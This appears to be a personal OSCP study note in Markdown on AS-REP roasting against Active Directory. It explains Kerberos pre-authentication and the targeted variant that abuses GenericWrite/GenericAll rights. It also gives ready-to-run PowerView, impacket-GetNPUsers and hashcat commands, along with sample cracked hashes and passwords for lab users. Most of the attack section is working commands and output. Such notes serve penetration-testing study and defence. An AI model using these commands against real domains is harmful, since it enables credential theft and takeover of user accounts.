---
aliases:
  - Active Directory Password Attacks - AS-REP roasting
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - active_directory
  - ad
  - adds
  - password_attack
  - as_rep_roasting
  - asrep_roasting
author: Mehdi N Tehrani
creat_date: 2024-01-07
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Kerberos Pre-authentication
#kerberos #preauth #pre_auth
`AS-REP` contains `TGT ticket` and `Session Key`
- [Microsoft Article](https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx)
If Kerberos pre-authentication in not implemented, AS-REP Roasting attack would be possible. Attacker can send an `AS-REQ` on-behalf of any domain user.

## Targeted AS-REP Roasting
#targeted_asrep_roasting #targeted 
- [AD Rights](https://adsecurity.org/?p=3658)
- [StealthBits](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/)

Targeting a certain use we have enough privileges to

If we have _GenericWrite_ or _GenericAll_ permissions on an AD account, we can use these permissions to modify the **User Account Control** value of the user to not require Kerberos preauthentication. We can then obatin the hash and set UAC setting back to normal.


# Identify
#powerview #get_domainuser
```powershell
Get-DomainUser -PreauthNotRequired
```
#impacket #get_np_users 
Get No Preauth Users:
```sh
impacket-GetNPUsers -dc-ip $dc_ip $domain/$user
```

# Attack

## Requirements


## Tools
### impacket
#impacket #get_np_users
```sh
impacket-GetNPUsers -dc-ip $dc_ip -request -outputfile $outfile $domain/$user
```

# Decrypt
### Hashcat
#hashcat 
```
hashcat --help | rg -Pie 'as-rep'
  18200 | Kerberos 5, etype 23, AS-REP 
```

```sh
hashcat -m 18200 $hashes_file $wordlsit -r $rules
```

Example
```sh
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
Output:
```
$krb5asrep$23$dave@CORP.COM:bc070af78b7c91a537ff84f80304cde4$b99905d15618c72be3a5694178a7dc9b471f305b8726028703727252559e51c98682369c19b80ffba431c5bf768b923c88fb3f74355762a2724417e684ade14691653c9ab6f359311877501efb439848bbcd74858cbc212889cff9fae880ecf1fbdc83ccf765269ca776dc9a1c1e50376f8e0bc1eaca3c32ef17ff8431531d518659b60c26fb09fb5280bff92bfa5182aed11384ca427d7f8cd73dd5c91e10969b49aac8ac141b1aa25cf28c2a22188a384df68249915b0a24819bd7ebef2d464f4f2ca5d02a08c33a8b6c96d392fe379355fb24bd7dd30d1d7abbcb9719a27384879391:Flowers1
$krb5asrep$23$jen@CORP.COM:7bec36be71a2d3ddc57afe16dd2bee10$245e39fdeeb241624bbb84662d840c9e5954d66f752fa1138d28e720c17d0bc33f035d0dec69c3526d49a025a5998ae425df91e1b3c507f684d4ed4ff833d7f805cf1a8db1d9551541b8e1dfebd2fe892f7abbc79f3723bc1082f1602bf34379fb8d8e8c8b4d5b4fb23a0f30a04e8bf9bdeec84103580e8b68b0697a756c242445a73989287e7973e2f2e7beb6190dcc5eedf8b4bcf8d5bc9d68f0c58839c623f2243ec22cd61439d908338b9cc5e7dec7dec3d1098a8a17d9e1ea91740a6ecd3d7f98477ceff63c12c6ce656cccb6246e58fbad78f696886c2d93ce413d29dfaa31bd78:Summerland1
```


